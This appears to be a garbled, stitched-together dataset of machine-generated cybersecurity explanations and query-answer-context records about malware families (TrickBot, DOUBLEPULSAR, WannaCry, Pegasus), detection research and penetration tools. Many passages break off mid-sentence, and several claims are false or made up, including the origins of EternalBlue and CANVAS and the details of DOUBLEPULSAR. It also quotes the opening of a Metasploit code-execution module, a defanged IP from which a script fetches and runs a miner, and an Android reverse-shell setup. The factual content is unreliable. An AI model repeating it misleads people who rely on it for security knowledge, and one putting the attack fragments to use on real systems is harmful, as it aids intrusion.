detecting and mitigating cryptocurrency malware. The framework uses a combination of static and dynamic analysis techniques to extract features from the malware and the system, which are then used to train machine learning models for detection.Sergio and Guillermo's work extends the MineSweeper framework by applying it to mobile devices and focusing specifically on crypto-mining botnets. They extract features from the network traffic data of mobile devices and use neural networks to classify the traffic as normal or malicious. By identifying and mitigating cryptoCoin, in the context of the provided information, refers to a type of malicious software or malware that is designed to hijack a computer's processing power to mine cryptocurrencies without the user's knowledge or consent. This is also known as cryptojacking.To prevent such malware from infecting a system, it is essential to keep all software, including operating systems, web browsers, and plugins, up to date with the latest security patches and updates. This can be achieved through regular software updates and the use of automatic update features and patch management tools.Another way to protect against cryptojacking is by installing reputable browser extensions or add-ons specifically designed to block cryptojacking scripts. Some popular options include MinerBlock, No Coin, and uBlock Origin. These tools work by detecting and blocking malicious scripts that attempt to use a user's computer to mine cryptocurrencies without their consent.Network traffic monitoring is another effective method for detecting and blocking cryptojacking attempts. By implementing network monitoring solutions, users can detect and block traffic patterns that are characteristic of cryptojacking activity. This can help prevent unauthorized use of computing resources and protect against the financial costs and performance degradation that can result from cryptojacking.Engin Kirda is a computer security researcher and academic, known for his contributions to the field of malware analysis and detection.

It was first identified in 2016 and is believed to have been created by Russian hacker Vladimir Dunaev, who pleaded guilty to creating and distributing the malware in a US court in 2021. TrickBot is primarily spread through email attachments and malicious links, and it can steal sensitive information, perform DDoS attacks, and download additional malware onto infected systems.TrickBot is written in the .NET language and is modular, meaning it can be easily updated and customized to perform various malicious activities. It is also known for its ability to steal credentials, inject malicious code into web traffic, and perform man-in-the-middle attacks. TrickBot is often used as a dropper for other malware, such as Ryuk ransomware.In the context of the recent news, it is important to note that TrickBot is still actively being used in cyber attacks. For instance, it has been linked to the New FjordPhantom Android malware, which targets banking apps in Southeast Asia. The attackers use TrickBot to deliver the FjordPhantom malware, which then steals login credentials and other sensitive information from the infected devices.Another significant threat related to TrickBot is the exploitation of its AWS STS (Simple Security Token Service) component to infiltrate cloud accounts.

In the context of the provided information, it appears that the author is concluding the first installment of a series on Windows Exploits. The author assumes that the reader has gained a foundational understanding of using a debugger, recognizing basic Assembly instructions, and has a high-level understanding of how Windows manages memory and how the stack operates.In the next post, the author plans to build upon this knowledge by introducing the concept of stack-based overflows using the same basic function `foo( )`. Stack-based overflows are a type of buffer overflow attack where an attacker overwrites the stack frame, potentially leading to arbitrary code execution or a denial-of-service condition.The author then intends to write a real-world example exploit, demonstrating the practical application of the concepts learned in the series. This will likely involve writing and executing malicious code to take advantage of a stack-based overflow vulnerability in a Windows application or the operating system itself.Overall, Windows Exploits is about gaining a deep understanding of the Windows operating system's internals, specifically in the context of identifying and exploiting vulnerabilities. This knowledge can be used for both defensive and offensive purposes, such as securing systems against attacks or developing tools to test the security of applications and operating systems.BotMiner is a botnet detection system proposed by Gu, Perdisci, Zhang, and Lee in the paper titled \"BotMiner: Clustering Analysis of Network Traffic for Protocol- and Structure-independent Botnet Detection,\" published in the proceedings of the 17th Conference on Security Symposium in 2008. The authors introduced BotMiner as a method for identifying botnet traffic in computer networks using clustering analysis.Botnets are networks of compromised computers, controlled by a central server, used to launch various types of cyber attacks, such as spamming, denial-of-service attacks, and data theft. Botnet traffic can be challenging to detect because it often employs various evasion techniques to avoid detection.BotMiner addresses this challenge by analyzing network traffic data instead of focusing on specific botnet protocols or structures. The system uses clustering analysis to group similar network traffic patterns together. The authors applied the DBSCAN (Density-Based Spatial Clustering of Applications with Noise) algorithm to identify clusters in the network traffic data.The BotMiner system consists of the following components:1. Data preprocessing: The system collects network traffic data and preprocesses it by extracting features such as packet length, inter-arrival time, and packet sequence.2. Clustering analysis: The preprocessed data is then analyzed using the DBWindows Defender, also known as Microsoft Defender, is a built-in antivirus solution developed by Microsoft for the Windows operating system. Its primary function is to protect computers from various types of malware, including viruses, worms, ransomware, spyware, and other malicious software. Windows Defender uses real-time protection, which means it constantly monitors the system for any potential threats and takes appropriate action to remove them.In the context of the provided information, it appears that a script is being run with the intention of disabling Windows Defender and removing certain cryptominer applications. Cryptominers are a type of malware that uses the processing power of an infected computer to mine cryptocurrencies without the user's knowledge or consent.The script first attempts to disable Windows Defender by making changes to the Windows Registry or other system configurations. Once Windows Defender is disabled, the script then looks for and removes any cryptominer applications that may be installed on the system.After disabling Windows Defender and removing the cryptominer applications, the script downloads and executes the next stage from the IP address 50.19.48[.]59:82. This next stage is a Monero crypto miner, which is a type of malware that uses the processing power of an infected computer to mine the Monero cryptocurrency.

The team's primary goal is to help the security community learn and understand various vulnerabilities and exploitation techniques.In the context of the provided information, @HackSysTeam has released a vulnerable driver named \"HackSysExtremeVulnerableDriver,\" which is available on GitHub under the name \"hacksysteam.\" This driver is intentionally vulnerable and is used as a target for exploit development in various tutorials and resources.The Windows exploit development tutorial series mentioned in the text is a collection of posts that walk through the process of exploiting vulnerabilities in the HackSysExtremeVulnerableDriver. In this specific post, the author is discussing a null pointer dereference vulnerability in the driver and providing instructions on how to exploit it.EMET (Microsoft Enhanced Mitigation Experience Toolkit) is a Microsoft toolkit used to mitigate various types of attacks, including heap spraying, stack pivoting, and other techniques. The author suggests using EMET to protect against potential attacks on the vulnerable driver.The \"Small Hax to avoid crashing ur prog\" link likely refers to a tool or technique used to bypass or mitigate crashes that might occur during the exploitation process. This could be a useful resource for those attempting to exploit the vulnerable driver without causing unintended crashes or system instabilityIn the context of the provided information, \"Networks\" likely refers to the journal titled \"Digital Communications and Networks\" where the research article \"Delay-CJ: A novel cryptojacking covert attack method based on delayed strategy and its detection\" by Xu et al. (2022) was published.\"Digital Communications and Networks\" is a peer-reviewed scientific journal that focuses on the publication of original research articles, technical reports, and survey papers related to digital communications and networks. The journal covers various aspects of digital communications and networks, including wireless communications, wired communications, network protocols, network security, and network architecture.The research article \"Delay-CJ\" by Xu et al. (2022) is a contribution to the field of network security. In this paper, the authors propose a novel cryptojacking covert attack method called \"Delay-CJ\" and present a detection mechanism to counteract it. Cryptojacking is a type of malware that secretly uses a victim's computing resources to mine cryptocurrencies without their knowledge or consent. Covert attacks are stealthy attacks that are difficult to detect and can bypass traditional security mechanisms.The authors of \"Delay-CJ\" describe a delayed strategy that attackers can use to evade detection in cryptojacking attacks. They demonstrate that this strategy can significantly reduce the chances of being detected by existing detection mechanisms. The authors also present a detection mechanism based on delay analysis and machine learning techniques to identify and mitigate the Delay-CJ attack.Overall, the paper \"Delay-CJ: A novel cryptojacking covert attack method based on delayed strategy and its detection\" by XuTDL, also known as Tdss, Tdss_Kelihos, or Tdss_Trojan, is a type of malware that is primarily spread through exploits of software vulnerabilities, specifically those that allow the loading of unsigned drivers. One of the most well-known exploits used for this purpose is CVE-2008-3841, which affects Microsoft's Windows operating system.TDL is a complex and multi-stage malware that is capable of various malicious activities, including but not limited to, downloading and installing additional malware, stealing sensitive information, and performing remote commands. The malware is known for its ability to evade detection by using various techniques such as code obfuscation, polymorphism, and encryption.In the context of the provided information, TDL is one of the malware families that uses the CVE-2008-3841 vulnerability to load an unsigned driver onto a compromised system. Once the driver is loaded, the malware can then carry out its malicious activities. It is important to note that TDL is not limited to this single vulnerability and can use other methods for propagation and execution as well.It is also worth mentioning that TDL is not an exploit itselfBirdMiner is a type of malware that specifically targets macOS systems. Malware authors create BirdMiner malware and distribute it in various ways to infect unsuspecting users. One common method is by disguising it as pirated or cracked applications.In this context, BirdMiner is a malicious software package that poses as a desirable application or utility, often a popular one, to lure users into downloading and installing it. The malware is bundled with the pirated or cracked application, making it seem like an essential component for the software to function properly.When users install the pirated or cracked application, they inadvertently install BirdMiner as well. This method is effective because many users, especially those who use macOS, may believe that the App Store is the only source for legitimate software. Installing software from other sources, such as the internet or external drives, can be perceived as risky but may be necessary for obtaining certain applications, especially if they are not available on the App Store or if they are expensive.Malware authors use this tactic to exploit users' trust and convince them to infect themselves. By bundling BirdMiner with seemingly harmless pirated or cracked applications, the malware authors can bypass users' defenses and gain unauthorized access to their systems. Once installed, BirdMiner can perform various malicious activities, such as steJayasinghe is a researcher or a team of researchers, specifically identified as K. Jayasinghe and G. Poravi, based on the given bibliographic sources. They have authored two academic papers related to cryptojacking detection.The first paper, published in the 35th IEEE/ACM International Conference on Automated Software Engineering (ASE) in 2020, is titled \"Semantics-aware analysis for ever-evolving cryptojacking detection.\" In this paper, they discuss the development and implementation of a semantics-aware analysis approach to detect cryptojacking attacks in software systems. Cryptojacking is a type of malware that covertly uses a victim's computing resources to mine cryptocurrencies without their knowledge or consent. The authors' goal is to create a detection system that can effectively identify and respond to these attacks as they evolve.The second paper, published in the 2nd Asia Pacific Information Technology Conference in 2020, is titled \"A survey of attack instances of cryptojacking targeting cloud infrastructure.\" In this paper, Jayasinghe and Poravi provide an in-depth analysis of various cryptojacking attacks that have targeted cloud infrastructure. They discuss the techniques used by attackers,EternalBlue is a well-known exploit developed by the hacking group known as the Shadow Brokers. It is a Microsoft Windows SMB (Server Message Block) exploit that takes advantage of a vulnerability in the SMB protocol, specifically CVE-2017-0144. This vulnerability was first discovered and disclosed by the National Security Agency (NSA) in 2016, but it was later leaked by the Shadow Brokers in April 2017.The SMB protocol is a common network file sharing protocol used in Microsoft Windows environments. EternalBlue exploits a vulnerability in the way that the SMB protocol handles certain types of requests, allowing an attacker to execute arbitrary code on a vulnerable system. Once an attacker has successfully exploited this vulnerability, they can gain remote access to the target system and potentially move laterally within a network.In the context of the reports you have provided, it appears that two individuals or groups used the EternalBlue exploit to gain control of a system named host2. The reports do not provide any additional information about the nature of the attack or the motivations behind it. However, it is worth noting that EternalBlue was used extensively in the WannaCry ransomware attack in May 2017, which affected hundreds of thousands of systems worldwide and caused significant damage.The information you have provided also mentions that the University of Pisa was the authorized licensee of the report and that it was downloaded on December 6, 2023. It is unclear from this information whether the reports are related to the EternalBlue exploit specifically or if they are simply discussing the vulnerability and its impact. However, it is worth notingDOUBLEPULSAR is a sophisticated and stealthy malware family that utilizes kernel-level DLL injection techniques to evade detection and gain persistence on compromised systems. The name \"DOUBLEPULSAR\" was given to this malware by F-Secure, a cybersecurity company, after they first discovered and analyzed it in 2017.The DOUBLEPULSAR malware is known for its ability to spread laterally within networks using the EternalBlue exploit, which takes advantage of a vulnerability in the Microsoft Server Message Block (SMB) protocol. This exploit was made public through the Shadow Brokers leak in 2017 and has since been used in several high-profile attacks, including the WannaCry ransomware attack.The DOUBLEPULSAR malware is delivered through various means, such as phishing emails, exploit kits, or malicious documents. Once the malware is executed on a system, it injects a malicious DLL (Dynamic Link Library) into the kernel of the operating system. This DLL, named \"csrsrv.dll,\" is designed to be highly evasive and difficult to detect.The csrsrv.dll module performs several functions to maintain persistence on the compromised system. It creates a new service named \"csrservice,\" which is designed to start automatically when the system boots up. It also sets up a reverse shell connection to a remote command-and-control (C&C) server, allowing the attackers to issue commands and receive data from the compromised system.One of the unique features of DOUBLEPULSAR is its use of a technique called \"process hollowing\" to inject the malicious DLL into theKarimipour is a researcher or a team of researchers, specifically identified as R. M. Karimipour in the given paper titled \"Detecting cryptomining malware: a deep learning approach for static and dynamic analysis,\" published in the Journal of Grid Computing in 2020. The paper focuses on the detection of cryptomining malware using deep learning techniques for both static and dynamic analysis.The authors of the paper, R. M. Karimipour, R. M. Parizi, and K.-K. R. Choo, present their research in the context of the growing trend of cryptomining malware in enterprise networks. Cryptomining malware is a type of malware that covertly uses the computational resources of an infected system to mine cryptocurrencies, often without the knowledge or consent of the system's owner.The paper aims to address the challenge of detecting cryptomining malware in enterprise networks by proposing a deep learning-based approach. The authors describe the data collection process, preprocessing techniques, and the design of their deep learning model for detecting cryptomining malware. They also discuss the evaluation of their model's performance using various metrics and compare it to other existing methods.In the context of the given information, Karimipour is the researcher or team of researchersWannaCry is a type of malware, specifically a ransomware, which was discovered and spread widely in May 2017. The malware is known for its destructive capabilities and its use of the EternalBlue exploit to propagate itself across networks.In the context of the given figure 1 and the mentioned methodology, WannaCry is one of the three malware samples that were obtained for the comparative analysis. The other two malware samples are Stuxnet, which is a worm and rootkit, and Resource Editor, which is a rootkit.The methodology for the analysis involves several steps. The first step is to obtain the malware samples. In this case, three samples were obtained: WannaCry, Stuxnet, and Resource Editor.Once the malware samples have been obtained, the next step is to perform a static analysis of the malware. Static analysis involves examining the malware's code without executing it in a live environment. This can provide valuable insights into the malware's functionality, structure, and behavior.The third step is to perform a dynamic analysis of the malware. Dynamic analysis involves executing the malware in a controlled environment, such as a sandbox, to observe its behavior in real-time. This can provide a more comprehensive understanding of the malware's capabilities and how it interacts with the system.The fourth step is to perform a reverse engineering of the malware. Reverse engineering involves disassembling the malware's code and understanding how it functions at a low level. This can provide insights into the malware's encryption algorithms, network communication protocols, and other advanced techniques usedSkidware is a term used to describe malware or software that is created and distributed by individuals who engage in hacking activities, often referred to as \"skidkids\" or \"skidions.\" The term \"Skidware\" itself is not a specific malware or software, but rather a label used to describe the malicious creations of these individuals.The context of the given blog post suggests that Skidware in this case refers to a specific malware family or campaign, possibly named \"Zemra,\" which has been identified and analyzed by various security researchers and organizations, including Symantec and Zemra.The Zemra malware is known to be a multi-purpose threat that can function as a backdoor, botnet controller, DDoS (Distributed Denial of Service) tool, exploit, and web application vulnerability exploiter. It is written in multiple programming languages, including C# and PHP, and is capable of infecting Windows systems.The blog post also mentions that the Zemra malware is of German origin and is tagged with various keywords related to hacking and security threats, such as botnet, Denial of Service, Exploit, Hack, Idiots, malware, PHP, Security, Skidware, Web Apps, backdoor, trojan, virus, and Zemra.The blog post also mentions the existence of \"rippers,\" which are tools used by hackers to extract and modifyM.

In the first paper published in the ACM/IEEE Symposium on Architectures for Networking and Communications Systems (ANCS) in May 2017, titled \"Remote Access Trojans through External Control at Area Network Bor-ders,\" M. Lindorfer is listed among the authors. The paper discusses the discovery and analysis of a type of Remote Access Trojan (RAT) that uses external control at area network borders. The authors describe the characteristics, behavior, and detection of this RAT, as well as proposing countermeasures.In the second paper published in the ACM SIGSAC Conference on Computer and Communications Security in January 2018, titled \"Minesweeper: An in-depth look into drive-by cryptocurrency mining and its defense,\" M. Lindorfer is again listed as an author. In this paper, the authors investigate drive-by cryptocurrency mining, which is a type of malware that covertly mines cryptocurrencies by exploiting web browsers. The authors present an in-depth analysis of the Minesweeper malware, which is a popular example of drive-by cryptocurrency mining, and propose countermeasures to prevent and mitigate the impact of such malware.Therefore, M. Lindorfer is a researcher or aAPIMiner is a research project led by Wenliang Du, with contributions from Heng Yin, in the field of API-level security. The primary focus of APIMiner is to detect malware and anomalous behavior in applications at the API level, using machine learning techniques.The project involves the analysis of bytecode of both positive (malware) and negative (legitimate) samples. The positive samples are obtained from various sources, including international detection agencies, while the negative samples are derived from legitimate applications.APIMiner employs privacy-preserving techniques in its analysis to ensure that sensitive information is not leaked during the analysis process. The project aims to reduce the number of false positives and false negatives in the large set of communication samples, which is a common challenge in malware detection.One of the main challenges in API-level malware detection is the high rate of false positives and false negatives in the Android environment. APIMiner addresses this challenge by using robust network analysis techniques to analyze the malware samples.The project's main demerits include the high rate of false positives and false negatives in the detection of malware samples in the Android environment. Specifically, the samples from Sydney, Australia, have a high rate of false positives and false negatives. This is a significant challenge in the field of API-level malware detection and is an area of ongoing research for the APIMiner project.Lucifer is a crypto miner and DDoS hybrid malware that leverages well-known exploits to spread laterally on Windows platforms.[1] Techniques used by Lucifer: Windows Management Instrumentation, Virtualization/Sandbox Evasion:System Checks, System Owner/User Discovery, System Network Connections Discovery, System Network Configuration Discovery, System Information Discovery, Scheduled Task/Job:Scheduled Task, Resource Hijacking, Remote Services:SMB/Windows Admin Shares, Query Registry, Process Discovery, Obfuscated Files or Information:Software Packing, Network Service Discovery, Network Denial of Service, Lateral Tool Transfer, Ingress Tool Transfer, Indicator Removal:Clear Windows Event Logs, Exploitation of Remote Services, Encrypted Channel:Symmetric Cryptography, Deobfuscate/Decode Files or Information, Command and Scripting Interpreter:Windows Command Shell, Brute Force:Password Guessing, Boot or Logon Autostart Execution:Registry Run Keys / Startup Folder, Application Layer ProtocolMiner-C is malware that mines victims for the Monero cryptocurrency.

{"query": "What are the relationships between Royal and Conti?", "time": 10.727988719940186, "Answer": " I must clarify that the given context does not provide enough information for me to directly determine the relationship between \"Royal\" and \"Conti.\" However, based on my expertise in cybersecurity, I can provide some possible connections between these terms in different contexts.1. Royal Bank and Conti Ransomware Group: If we consider \"Royal\" as referring to a royal bank or financial institution, there is no known direct connection with the Conti ransomware group. However, banks and other financial institutions have been common targets for various ransomware groups like Conti. These criminals may target such organizations due to their large cash reserves and critical operations, which could be severely impacted by a successful attack. The relationship here would be indirect; both entities operate within the same industry but do not share any official ties.2. Royal-themed Malware Campaigns: Sometimes, malware campaigns adopt themes related to popular culture, including royals, to lure potential victims into downloading infected files or clicking links leading to compromised websites. For instance, if \"Royal\" refers to members of a royal family, it's plausible that threat actors might create phishing emails disguised as correspondence from actual royals. This scenario seems unlikely since the provided context doesn't suggest any deception tactics involving royals. Nonetheless, this possibility should be considered when evaluating the relationship between \"Royal\" and \"Conti.\"3. Shared Infrastructure or Techniques: Another way to connect \"Royal\" and \"Conti\" is through shared infrastructure (such as IP addresses, domains, etc.) or techniques used during attacks. Threat intelligence platforms help identify overlaps across different cybercrime activities. Based on available data, one could infer whether \"Royal\" has any relation to \"Conti,\" either via collaboration or membership in the same criminal network. Unfortunately, without specific details about each entity, it remains challenging to establish a clear link between them using this approach.In summary, while I cannot pinpoint an exact relationship between \"Royal\" and \"Conti\" based solely on the given context, they might intersect indirectly through industries targeted by ransomware groups or general trends in cybercriminal activity.

{"query": "What are the differences between KOCTOPUS and Octopus?", "time": 11.092200994491577, "Answer": " Thank you for considering me as an expert in the field of cybersecurity. I will do my best to provide a detailed and comprehensive answer to the final question regarding the differences between KOCTOPUS and Octopus based on the given context.In summary, KOCTOPUS is a loader variant used by LazyScripter since 2018 to launch different types of malware such as Octopus, Koadic, and QuasarRAT. On the other hand, Octopus is one of the malware families that can be launched using KOCTOPUS. Therefore, KOCTOPUS is a tool used to distribute and execute Octopus, among other malware families. In this response, I will discuss their differences in terms of techniques used during their execution.Based on the provided context, here are the primary techniques employed by KOCTOPUS and how they differ from those utilized by Octopus:1. **Command and Scripting Interpreter**: PowerShell is commonly used by both KOCTOPUS and Octopus. However, it plays a more significant role in KOCTOPUS than in Octopus. As a loader, KOCTOPUS relies heavily on PowerShell scripts to download and load its payload onto the victim's machine. Meanwhile, Octopus may not necessarily require PowerShell to perform its intended functions once loaded into memory. Instead, Octopus focuses on stealing sensitive information like credentials and exfiltrating data without leaving many traces behind.2. **Boot or Logon Autostart Execution**: Both KOCTOPUS and Octopus employ persistence mechanisms to ensure their continued operation even after reboots. While KOCTOPUS uses Registry Run Keys and the Startup folder to achieve this goal, Octopus typically does not rely on these specific methods. Alternatively, Octopus might inject itself into legitimate processes or services to maintain persistence. This difference highlights KOCTOPUS's focus on ensuring successful delivery and execution of its payload (e.g., Octopus), while Octopus aims to remain undetected and persistent within the target system.3. **Abuse Elevation Control Mechanism**: Bypass User Account Control (UAC) is another technique shared by KOCTOPUS and Octopus. UAC bypass allows threat actors to evade restrictions imposed by Windows security policies when executing privileged operations. Although KOCTOPUS employs UAC bypass primarily to escalate its own privileges before delivering its payload, Octopus could potentially utilize similar techniques post-execution to gain higher access levels and steal more valuable information.In conclusion, although KOCTOPUS and Octopus share certain techniques related to PowerShell usage, UAC bypass, and persistence, there exist notable differences in their implementation. These discrepancies stem mainly from KOCTOPUS being a loader with the purpose of distributing various malware families, whereas Octopus serves as a standalone malware family focused on data theft and exfiltration. Understanding these distinctions helps defenders better detect, analyze, and respond to potential threats involving either KOCTOPUS or Octopus.", "context": "Code Available:METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##require 'json'class MetasploitModule < Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Remote::HttpClient include Msf::Exploit::Powershell def initialize(info = {})   super(update_info(info,     'Name'        => 'Octopus Deploy Authenticated Code Execution',     'Description' => %q{         This module can be used to execute a payload on an Octopus Deploy server given         valid credentials or an API key.

{"query": "What are the similarities between MimiPenguin and Mimikatz?", "time": 8.95679759979248, "Answer": "Both MimiPenguin and Mimikatz are credential dumpers, which are tools used to extract credentials from operating systems. The primary similarity between these two tools is their function - they are both used to gather sensitive information such as usernames, passwords, and hashed passwords that can be used for further exploitation or internal reconnaissance. This type of information is often targeted by attackers because it allows them to move laterally within a network, escalate privileges, and maintain persistence. By using these tools, security professionals and penetration testers can evaluate the effectiveness of their organization's countermeasures and determine where improvements are needed.Some specific techniques shared by MimiPenguin and Mimikatz include:1. **OS Credential Dumping**: Both tools focus on extracting credentials stored in various locations within the operating system. For example, Mimikatz targets Windows components like Local Security Authority (LSA) secrets, Security Account Manager (SAM), and Kerberos tickets, while MimiPenguin focuses on Linux-based systems, targeting files containing authentication data such as /etc/passwd, /etc/shadow, and /var/run/utmp.2. **Memory Analysis**: To access cached credentials and tokens, both tools analyze memory contents. In particular, Mimikatz scans process memory to recover cleartext credentials, NTLM hashes, and Kerberos ticket material. Similarly, MimiPenguin searches for processes storing sensitive information, such as PID files related to SSH or login sessions.3. **Multi-platform Support**"}
{"query": "What are the differences between Pegasus for iOS and for Android?", "Answer": "Pegasus for iOS and for Android are both types of malware attributed to the NSO Group and designed to infect mobile devices. However, there are some key differences between them due to the varying underlying architectures of iOS and Android. Here are some notable distinctions: 1. Target selection: While both versions aim to target high-value individuals, Pegasus for iOS focuses mainly on iOS devices, especially iPhones. In contrast, Pegasus for Android targets Android devices.2. Exploitation methods: Due to the more secure nature of iOS compared to Android, Pegasus for iOS relied heavily on exploiting previously unknown vulnerabilities (zero-days). For instance, the infamous Trident exploit chain (CVE-2016-4656, CVE-2016-4657, and CVE-2016-4658) allowed Pegasus for iOS to jailbreak vulnerable iPhones silently. On the other hand, Pegasus for Android uses tactics like drive-by downloads, dropper apps, and social engineering techniques to trick users into granting permissions.3. Functionality: Both versions have similar functionalities, such as extracting sensitive data, recording conversations, activating cameras and microphones, intercepting messages, and maintaining persistence on the victim's device. However, given the openness of Android, Pegasus for Android may require fewer privileges than Pegasus for iOS to achieve certain functions.4. Detection: Since Android permits greater customization and flexibility, anti-malware tools often find it challenging to identify threats within the ecosystem. As a result, Pegasus for Android might evade detection easier than Pegasus for iOS. Nevertheless, recent improvements in iOS security measures make it increasingly harder for Pegasus for iOS to maintain persistence after initial infection.5. Distribution channels: Pegasus for iOS typically employs spear-phishing via text messages containing suspicious URLs directing users to malicious sites hosting the exploits. Meanwhile, Pegasus for Android distributes its payload through app stores, sideloaded APK files, and even official OTA (Over-the-Air) updates.While both Pegasus for iOS and Pegasus for Android share many characteristics, the primary difference lies in their distribution strategies, exploitation methods, and overall ease of implementation due to the inherent restrictions imposed by each platform."}{"query": "What is the difference between CANVAS and Metasploit?'", "Context": "# Corelan Cybersecurity Research  ## :: Knowledge is not an object, its a flow ::    * Home   *   * Articles   *   * Free Tools     * AD & CS       * AD Disable Users       * Certificate List Utility       * PVE Find AD User     * Exchange Transport Agents       * Attachment filter       * Attachment rename     * Networking       * Cisco switch backup utility       * Network monitoring with powershell       * TCP Ping     * Security Related Tools   *   * Security     * Corelan Team Members       * Corelan Team Membership     * __Corelan Training \"Corelan Live\u2026     * Exploit writing tutorials     * Metasploit       * FTP Client fuzzer       * HTTP Form field fuzzer       * Simple FTP Fuzzer - Metasploit\u2026     * Nessus/Openvas ike-scan wrapper     * Vulnerability Disclosure Policy     * __mona.py PyCommand for Immunity Debugger       * __Download mona.py       * Mona.py - documentation     * Corelan ROPdb     * Mirror for BoBs Immunity Debugger\u2026   *   * Terms of use   *   * Donate   *   * About\u2026     * About Corelan Team     * About me     * Antivirus/antimalware     * Corelan public keys     * Sitemap         \u00ab Offensive Security Hacking Tournament - How strong was my fu ?

Since there are too many ways to mutate a shellcode, detecting polymorphic codes on an IPS is particularly tricky. An IPS may need to decrypt the encrypted code to restore the original signature, or even emulate the code execution (e.g.,on a sandbox that emulates the execution on the target hosts) to \ufb01nd malicious behavior.

Evasion tools Table I summaries several well-known free tools for the aforementioned evasion techniques: Fragroute (www.monkey. org/ \u223cdugsong/fragroute), which can exploit TCP/IP protocols, (2)Nikto (cirt.net/nikto2), which can transform URI requests, (3)ADMmutate (www.databaseofspyware.com/ADMmutate. php), which can transform the shellcode of attacks, (4) Sploit [8], which can provide a framework for most of the evasion techniques above, (5) Metasploit (www.metasploit. com), which can provide many shell-mutation encoders, and (6) Havij (itsecteam.com/en/pr ojects/project1.htm), which can launch SQL injection attacks with mutated strings.Fragroute implements packet splitting and duplicate inser- tion at the TCP/IP layer and helps the attackers evade signaturematching on the IPSs. The attackers can write a simple script to arrange the sequence of evasi on techniques to be launched before running Fragroute, which then automatically transformsthe attack traf\ufb01c into the speci\ufb01ed format to cheat the IPSs. Nikto , a Web scanning tool for generating multiple mali- cious URI requests, helps developers and network administra-tors test their Web servers for possible security problems. This tool also provides anti-IPS methods that can exercise payload mutation to help a Web scanner evade IPSs. The attackers canleverage these methods for evasion with payload mutation.

The engine can obfuscate the appearance of a piece of shellcode, but retain its effectiveness to exploit a software vulnerability. A program compiled with the ADMmutate API can generate different forms of shellcodeto confuse a signature-based IPS. Sploit is an evasion testing framework that allows the testers and attackers to develop new attacks and evasion techniques. This tool includes most of the evasion techniques provided by Fragroute, Nikto and ADMmutate. It also implements payload mutation on the messages of application protocolssuch as FTP and IMAP. For example, xff xf1 is a telnet control sequence that de notes \u201cno operation\u201d, so a PASS FTP command can be replaced with Pxff xf1ASS to evade detection by an IPS matching the pattern PASS [8]. Metasploit is a framework for penetration testing, IDS signature development, and exploit research. It supports de-velopment of exploit codes against a remote target host. The Metasploit Framework also provides more polymorphic shellcode encoders [11] than ADMmutate and Sploit. Theencoders allows a penetration tester to mutate the exploit codes for evasion testing. Havij is an automated SQL injection tool to exploit SQL injection vulnerabilities on Web pages. It supports evasion by manipulating white space in the attack strings, replacing space with the comment syntax of the C language, encoding thecharacters in hexadecimal, BASE64, and so on.

D.Android Malware APK Creation/Hacking To infect the phone, the attack er (PC) created a listener to  act as a terminal to send data back to the attacker device (PC).  Alongside this, we opened an Apache2 web server to store the  infected APK which will be sent to the target device.  After the  listener and web server were established, metasploit was booted up to perform the attack on the device. We first setup the reverse tcp connection to be able to send back data from our unsuspecting victim device, an IP address, and a port where the attacking device could listen to. At this point in the simulation, the researchers would have to perform a sort of social engineering attack for the victim\u2019s device to be infiltrated via  convincing the victim to install the infected apk file we created  but, in this simulation, it is as sumed that the social engineering  attack had already been established. With that, we shall skip over to after the supposed social engineering attack on the  victim had already been done. Now that the attacking device has a connection to the victim,  it was able to send a prompt to download the infected apk to the device. However, before the installation, Play Protect was able  to detect suspicious activity with the file and prompted the user to reconsider installing the app. In this scenario, we assume the  attackers were able to social engineer their way into conv incing  the victim to move forward in installing regardless of the warning by Play Protect . After installation of the app was  complete, a connection would be established with our listener as  seen in the image below.

Both tools are used for penetration testing and exploiting vulnerabilities, but they have some differences in features and functionality.\n\nMetasploit is a comprehensive framework for penetration testing, IDS signature development, and exploit research. It supports the development of exploit codes against remote target hosts and provides more polymorphic shellcode encoders than ADMmutate and Sploit. Metasploit also includes various post-exploitation modules for maintaining access to compromised systems.\n\nCANVAS, on the other hand, is a commercial penetration testing platform developed by Core Security Technologies. It offers a graphical user interface (GUI) and supports various types of vulnerability assessments, including network, web application, and client-side assessments. CANVAS also includes advanced features like automated exploit generation, reporting, and integration with other security tools.\n\nAnother difference between the two tools is the supported platforms for installation. Metasploit supports various platforms, including Windows, Linux, Mac OS X, and mobile phones, among others. CANVAS, being a commercial product, is typically installed on enterprise networks and is designed to work on various operating systems and platforms, depending on the customer's needs.\n\nIn summary, while both Metasploit and CANVAS serve similar purposes in penetration testing and exploiting vulnerabilities, they differ in terms of their availability, pricing, and specific features. Metasploit is open-source and free, while CANVAS is a commercial product with advanced features and a graphical user interface."}

Then about 50 yearsago, people working on a mainframe computer left messages or put a file insomeone else\u2019s directory on a Direct Access Storage Device (DASD) drive,and so the first electronic messaging system was born. Although mostbelieve that electronic mail, or e-mail as it is called today, was started withthe ARPA net, that is not the case. Electronic communication has beenaround for a much longer period than that, and securing that informationhas always been and will always be a major issue for both governmentTypicalrates include a 4:1 compression ratio between DTE and DCE speeds. Thus, for aV.34 modem (28,800 bps), the DTE-DCE rate is 115,200 bps. This rate is userconfigurable.Dual-attachment Station (DAS) An FDDI node that is connected to two full, dual-fiber rings and have the ability to reconfigure the network to form a valid networkfrom components of the two rings in case of a failure. A DAS is also called Class Anode.E.164 An ITU-T standard network addressing format that resemble telephonenumbers. E.164 addresses are 15 decimal digits long and include a country code,area or city code, and a local number. Country codes are two or three digits longand consist of a zone code followed by a one- or two-digit national identifier. Area orcity codes are up to four digits long. If an address contains less than 15 digits, thenit is padded with hexadecimal Fs.FDDI was designed to function as ahigh-speed transport backbone; therefore, FDDI assumes workstations will not attach directly to itsrings, but to a MAU or router, as they cannot keep up with the data transfer rates (see Figure 3.10).Consequently, frequent station power cycles will cause ring reconfigurations; therefore, it isrecommended that directly connected MAUs be powered on at all times.FDDI rings operate in synchronous and asynchronous modes, which are defined as follows:\u2022 Synchronous. Stations are guaranteed a percentage of the total available bandwidth.\u2022 Asynchronous. Stations transmit in restricted or nonrestricted conditions. A restricted stationcan transmit with up to full ring bandwidth for a period of time allocated by stationmanagement; as nonrestricted stations, all available bandwidth, minus restrictions, will bedistributed among the remaining stations.Stations can attach to FDDI as single-attached-stations (SAS) or dual-attached-stations (DAS).

